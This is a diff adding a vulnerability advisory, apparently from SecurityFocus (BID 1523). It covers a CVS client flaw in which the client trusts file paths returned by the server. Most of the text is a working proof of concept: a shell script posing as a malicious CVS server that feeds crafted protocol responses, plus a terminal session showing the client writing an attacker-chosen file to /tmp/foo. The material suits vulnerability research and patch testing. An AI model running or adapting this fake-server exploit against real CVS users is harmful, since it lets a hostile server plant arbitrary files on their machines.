@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/1523/info
+
+The cvs client blindly trust paths returned to it by the server. Therefore, a cvs client could be tricked into creating a file anywhere on the system by a malicious server. 
+
+This problem can be tested yourself as follows. Although this example
+runs a faked cvs server using the :ext: method, this vulnerability is
+available with any method (including :pserver: of course).
+
+% ls -l /tmp/foo
+ls: /tmp/foo: No such file or directory
+% cat crackers-cvs-server
+#!/bin/sh
+
+cat <<'End'
+Valid-requests Root Valid-responses valid-requests Repository Directory Max-dotdot Static-directory Sticky Checkin-prog Update-prog
+Entry Kopt Checkin-time Modified Is-modified UseUnchanged Unchanged Notify Questionable Case Argument Argumentx Global_option
+Gzip-stream wrapper-sendme-rcsOptions Set Kerberos-encrypt expand-modules ci co update diff log add remove update-patches
+gzip-file-contents status rdiff tag rtag import admin export history release watch-on watch-off watch-add watch-remove watchers
+editors init annotate noop
+ok
+Module-expansion tst
+ok
+Clear-sticky tst/
+/cvsroot/tst/
+Clear-static-directory tst/
+/cvsroot/tst/
+E cvs server: Updating tst
+Created /tmp/
+/cvsroot/tst/foo
+/foo/1.1///
+u=rw,g=rw,o=rw
+4
+abc
+ok
+End
+% CVS_RSH=./crackers-cvs-server cvs -f -d :ext:user@server:/cvsroot co tst
+cvs server: Updating tst
+cvs checkout: in directory /tmp:
+cvs checkout: cannot open CVS/Entries for reading: No such file or directory
+cvs checkout: cannot open CVS/Entries.Log: No such file or directory
+% ls -l /tmp/foo
+-rw-r--r-- 1 akr wheel 4 Jul 19 22:01 /tmp/foo
+% cat /tmp/foo
+abc 
